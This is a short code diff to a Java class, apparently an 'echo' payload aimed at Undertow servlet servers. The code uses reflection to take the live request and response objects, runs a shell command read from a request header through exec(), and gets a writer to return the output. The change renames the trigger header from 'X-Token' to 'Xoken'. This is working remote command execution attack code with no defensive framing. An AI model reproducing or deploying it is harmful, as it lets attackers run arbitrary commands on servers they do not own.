@@ -26,7 +26,7 @@ public class UndertowEcho {
                 if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                     Object request = getFieldValue(value, "originalRequest");
                     Object response = getFieldValue(value, "originalResponse");
-                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
+                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "Xoken");
                     String result = exec(header);
 
                     Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
